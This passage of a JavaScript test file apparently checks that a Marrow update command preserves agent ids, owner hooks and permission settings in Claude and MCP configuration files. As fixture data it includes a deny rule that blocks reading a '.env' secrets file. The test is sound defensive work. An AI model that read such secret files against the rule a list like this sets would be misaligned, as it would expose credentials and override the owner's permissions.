    await updateFromShell(project, { MARROW_FLEET_AGENT_ID: RUNNER }, { home: ws.home });
    assert.deepEqual(oracle(cursorFile, { MARROW_FLEET_AGENT_ID: 'cursor-a' }, ws.home), pairsBefore[1]);
    assert.deepEqual(oracle(mcpPath(ws.home), launcher, ws.home), pairsBefore[0]);
    assert.ok(!seen.some((entry) => entry.agent === RUNNER));
  } finally { server.close(); ws.cleanup(); }
});

// ---- M11: never looser -----------------------------------------------------------------------------------------------

test('M11: update adds no id the owner did not record or pass, and every hook, permission and non-identity byte is identical', async () => {
  const ws = world();
  try {
    await recordedHome(ws, 'cliff-agent', { grok: true });
    // owner permissions and an owner hook beside Marrow's, in the user settings
    const settingsFile = path.join(ws.home, '.claude', 'settings.json');
    const settings = readJson(settingsFile);
    settings.permissions = { allow: ['Bash(ls:*)'], deny: ['Read(./.env)'] };
    settings.hooks.PreToolUse = [{ matcher: 'Bash', hooks: [{ type: 'command', command: '/owner/check.sh' }] }, ...settings.hooks.PreToolUse];
    fs.writeFileSync(settingsFile, `${JSON.stringify(settings, null, 2)}\n`);
    fs.writeFileSync(path.join(ws.home, '.marrow', 'control.json'), '{"enabled":true}\n', { mode: 0o600 });
    const before = treeHashes(ws.home);
    const hooksBefore = JSON.stringify(readJson(settingsFile).hooks);
    await updateFromShell(ws.home, { MARROW_FLEET_AGENT_ID: RUNNER, MARROW_AGENT_ID: RUNNER });
    const after = treeHashes(ws.home);
    const changed = Object.keys(after).filter((name) => before[name] !== after[name] && !(after[name] === 'dir' && before[name] === 'dir'));
    // Only update-owned state may differ: nothing identity-carrying, no hook line, no permission, no control value.
    assert.deepEqual(changed.filter((name) => /control\.json$|settings\.json$|marrow\.json$/.test(name)), [], `changed: ${changed}`);
    assert.equal(JSON.stringify(readJson(settingsFile).hooks), hooksBefore);
    assert.deepEqual(readJson(settingsFile).permissions, settings.permissions);
    assert.equal(mcpEnv(ws.home).MARROW_FLEET_AGENT_ID, 'cliff-agent');
    assert.deepEqual(filesContaining(ws.home, RUNNER), []);
  } finally { ws.cleanup(); }
});
